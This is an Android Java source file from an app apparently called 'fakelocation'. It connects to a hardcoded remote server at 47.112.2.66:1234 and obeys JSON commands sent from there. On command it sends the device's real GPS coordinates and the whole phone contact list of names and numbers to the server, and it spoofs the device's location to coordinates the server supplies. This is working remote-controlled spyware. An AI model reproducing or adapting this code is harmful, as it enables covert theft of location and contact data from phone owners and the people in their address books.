package com.swj.fakelocation;

import android.database.Cursor;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

import static com.swj.fakelocation.FakeLocationApplication.TAG;
import static com.swj.fakelocation.FakeLocationApplication.getContext;
import static com.swj.fakelocation.FakeLocationApplication.realuri;


class GpsLocation
{
    double lon;
    double lat;
}

public class getMainsocket
{
    private static String ip = "47.112.2.66";

    private static int port = 1234;

    public static void  connMainsocket(String tag, final FakeLocationApplication.ServerHandler handler) {
        new Thread() {
            @Override
            public void run() {
                try {

                    JSONObject jsonOk = new JSONObject();

                    jsonOk.put("ok","ok");

                    Socket socket = new Socket(ip, port);

                    Log.e(TAG, "连接成功" );

                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());

                    DataInputStream in = new DataInputStream(socket.getInputStream());

                    PrintWriter pw = new PrintWriter(out);

                    //out.writeUTF(send);

                    byte[] bytes = new byte[1024];

                    int len = in.read(bytes);

                    String receiver = new String(bytes,0,len);

                    Log.e(TAG, "接收成功 ");



                    JSONObject jsonObject = new JSONObject(receiver);

                    String real = "";
                    if(jsonObject.getString("real")!=null)
                    {
                        real = jsonObject.getString("real");
                        Log.e(TAG, "real:"+real);
                    }

                    String cheat = "";
                    if(jsonObject.getString("cheat") != null)
                    {
                        Log.e(TAG, "cheat:"+cheat);
                        cheat = jsonObject.getString("cheat");
                    }

                    String dire = "";
                    if(jsonObject.getString("dire")!=null)
                    {
                        dire = jsonObject.getString("dire");
                        Log.e(TAG, "dire:"+dire);
                    }

                    String exit = "";
                    if(jsonObject.getString("exit")!=null)
                    {
                        exit = jsonObject.getString("exit");
                        Log.e(TAG, "exit:"+exit);
                    }


                    Log.e(TAG, "开始判断 " );
                    if (exit.equals("1"))
                    {
                        Log.e(TAG, "exit_handle");
                        out.write(jsonOk.toString().getBytes());
                        Log.e(TAG, "exit_handle_success");
                        out.close();
                        socket.close();
                        return;
                    }
                    if(real.equals("1") && dire.equals("1") && cheat.equals("1"))
                    {
                        Log.e(TAG, "real_dire_cheat_handle");
                        out.write(getAll().getBytes());
                        Log.e(TAG, "real_dire_cheat_handle_success");
                        setGPS(TAG,jsonObject,handler);
                    }
                    else if (real.equals("1") && dire.equals("1"))
                    {
                        Log.e(TAG, "real_dire_handle");
                        Log.e(TAG, getAll());

                        out.write(getAll().getBytes());
                        Log.e(TAG, "real_dire_handle_success");
                    }
                    else if(real.equals("1") && cheat.equals("1"))
                    {
                        Log.e(TAG, "real_cheat_handle");
                        out.write(getReal().getBytes());
                        Log.e(TAG, "real_dire_handle_success");
                        setGPS(TAG,jsonObject,handler);
                    }
                    else if(real.equals("1"))
                    {
                        Log.e(TAG, "real_handle");

                        out.write(getReal().getBytes());
                        Log.e(TAG, "real_handle_success");
                    }
                    else if (cheat.equals("1"))
                    {
                        setGPS(TAG,jsonObject,handler);

                        out.write(jsonOk.toString().getBytes());
                        Log.e(TAG, "real_dire_handle_ok");
                    }
                    else if (dire.equals("1"))
                    {
                        Log.e(TAG, "dire_handle");
                        out.write(getDir().getBytes());
                        Log.e(TAG, "dire_handle_success");
                    }
                    Log.e(TAG, "结束判断 " );

                    out.close();
                    in.close();
                    socket.close();

                } catch (IOException e) {
                    Log.e(TAG, Log.getStackTraceString(e));
                } catch (JSONException e) {
                    Log.e(TAG, Log.getStackTraceString(e));
                }

            }
        }.start();
    }



    public static String getReal()
    {
        String send = "";
        try {
            JSONObject jsonRealSend = new JSONObject();
            JSONObject jsonReal = new JSONObject();
            GpsLocation location = getLocation();
            jsonReal.put("lat",location.lat);
            jsonReal.put("lng",location.lon);
            jsonRealSend.put("real",jsonReal);
            send = jsonRealSend.toString();

        } catch (JSONException e) {
            Log.e(TAG,Log.getStackTraceString(e));
        }
        return send;
    }

    public static String getDir()
    {
        String send = "";
        try
        {
            JSONObject jsonSend = new JSONObject();
            jsonSend.put("dire",getDireJson());
            send = jsonSend.toString();
        }
        catch (JSONException e)
        {
            Log.e(TAG, Log.getStackTraceString(e));
        }
        return send;

    }
    public static String getAll()
    {
        String send = "";
        try {
            JSONObject jsonSend = new JSONObject();
            JSONObject jsonReal = new JSONObject();
            GpsLocation location = getLocation();
            jsonReal.put("lat",location.lat);
            jsonReal.put("lng",location.lon);
            jsonSend.put("real",jsonReal);

            jsonSend.put("dire",getDireJson());
            send = jsonSend.toString();


        } catch (JSONException e) {
            Log.e(TAG, Log.getStackTraceString(e));
        }
        return send;
    }

    public static GpsLocation getLocation()
    {
        GpsLocation realLocation = new GpsLocation();
        Cursor cursor = null;
        try{
            cursor =  getContext().getContentResolver().query(realuri,null,null,null,null);
            if(cursor.moveToLast())
            {
                realLocation.lat = cursor.getDouble(cursor.getColumnIndex("lat"));
                realLocation.lon = cursor.getDouble(cursor.getColumnIndex("lon"));
            }
        }
        catch (Exception e)
        {
            Log.e(TAG, Log.getStackTraceString(e));
        }
        finally {
            if (cursor !=null){
                cursor.close();
            }
        }
        return realLocation;
    }
    public static JSONObject getDireJson()
    {
        JSONObject jsonDir = new JSONObject();
        Cursor cursor = null;
        try{//查询联系人数据
            cursor =  getContext().getContentResolver().query(ContactsContract.CommonDataKinds.
                    Phone.CONTENT_URI,null,null,null,null);
            if(cursor != null){
                while (cursor.moveToNext()){
                    String dispalyname= cursor.getString(cursor.getColumnIndex
                            (ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    //Log.e(TAG, "name:"+dispalyname);
                    String number= cursor.getString(cursor.getColumnIndex
                            (ContactsContract.CommonDataKinds.Phone.NUMBER));
                    //Log.e(TAG, "number:"+number);
                    jsonDir.put(dispalyname,number);
                }
            }
        }catch (Exception e){
            Log.e(TAG, Log.getStackTraceString(e) );
        }finally {
            if (cursor !=null){
                cursor.close();
            }
        }
        return jsonDir;
    }

    private static void setGPS(final String tag,JSONObject jsonObject,Handler handler) throws JSONException
    {
        Log.e(tag, "cheat_handle");
        GpsLocation location = new GpsLocation();
        location.lon = jsonObject.getDouble("lng");
        Log.e(tag, ""+location.lon );
        location.lat = jsonObject.getDouble("lat");
        Log.e(tag, ""+location.lat);
        Message message = new Message();
        message.obj = location;
        message.what = 0;
        handler.sendMessage(message);
    }
}
